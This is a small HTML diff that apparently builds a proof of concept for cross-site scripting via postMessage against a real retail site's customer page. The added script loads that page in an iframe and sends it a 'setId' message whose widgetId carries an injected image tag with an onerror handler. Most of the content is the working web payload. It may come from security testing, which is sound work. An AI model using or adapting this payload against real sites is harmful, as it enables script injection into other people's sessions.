@@ -6,9 +6,14 @@
 <body>
   <iframe src="https://www.boozt.com/eu/en/customer?oauth=1"></iframe>
 <script>
-    window.addEventListener("message", function(e) {
-    console.log("Received message:", e.data);
-});
+   const iframe = document.querySelector("iframe");
+
+iframe.onload = () => {
+  iframe.contentWindow.postMessage({
+    command: "setId",
+    widgetId: "<img src=x onerror=alert(1)>"
+  }, "*");
+};
     
     </script>
 </body>
